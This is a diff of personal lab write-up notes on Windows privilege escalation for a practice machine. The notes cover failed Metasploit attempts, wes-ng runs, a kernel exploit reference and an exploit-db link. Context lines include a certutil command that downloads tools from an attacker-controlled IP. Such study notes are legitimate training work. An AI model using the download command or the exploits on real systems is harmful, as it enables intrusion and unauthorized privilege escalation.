@@ -57,4 +57,15 @@ certutil.exe -urlcache -split -f "http://$IP/$tools"
 ```
 
 Basically I would have to blow my metasploit on this machine.
-Before reading a writeup to the walkthrough the same process I will redo the metasploit version with the post module as meterpreter just seems although a good way to end in one usage, I am at the PrivEsc phase. Plus I have not use it enough so far. Even the post module did not work. Then meterpreter did not work. I then tried Sherlock from my see as wes-ng did not work.
+Before reading a writeup to the walkthrough the same process I will redo the metasploit version with the post module as meterpreter just seems although a good way to end in one usage, I am at the PrivEsc phase. Plus I have not use it enough so far. Even the post module did not work. Then meterpreter did not work. I research ways to host files on windows as it seems like a hobby at this point finding and archiving every possible way to transfer files. I ended up copying and pasting into a systeminfo.txt file to this directory. Wesng works, but does not find the intend route. 
+
+```bash
+./wes.py --update
+./wes.py systeminfo.txt > wesng-out.txt
+```
+There is a kernel exploit for the cpu that has metasploit module to it. I tried that did not work as well doing it manually compiling it, but I could not finder one of the headers. Write ups suggest a pre-compiled binary. That seems really stupid. There is metasploit module for this so this machine is basically goodbye your metasploit usage in the exam machines given time constraints. 
+
+[manual](https://www.exploit-db.com/exploits/15589) Seems like there are errors in the script.
+
+At this point after multiple days trying to crack this. I revert this to a walkthrough for the remaining part.
+From a multitude of writeups that I have then read and watched, either its through metasploit... or a precompiled binary from github...
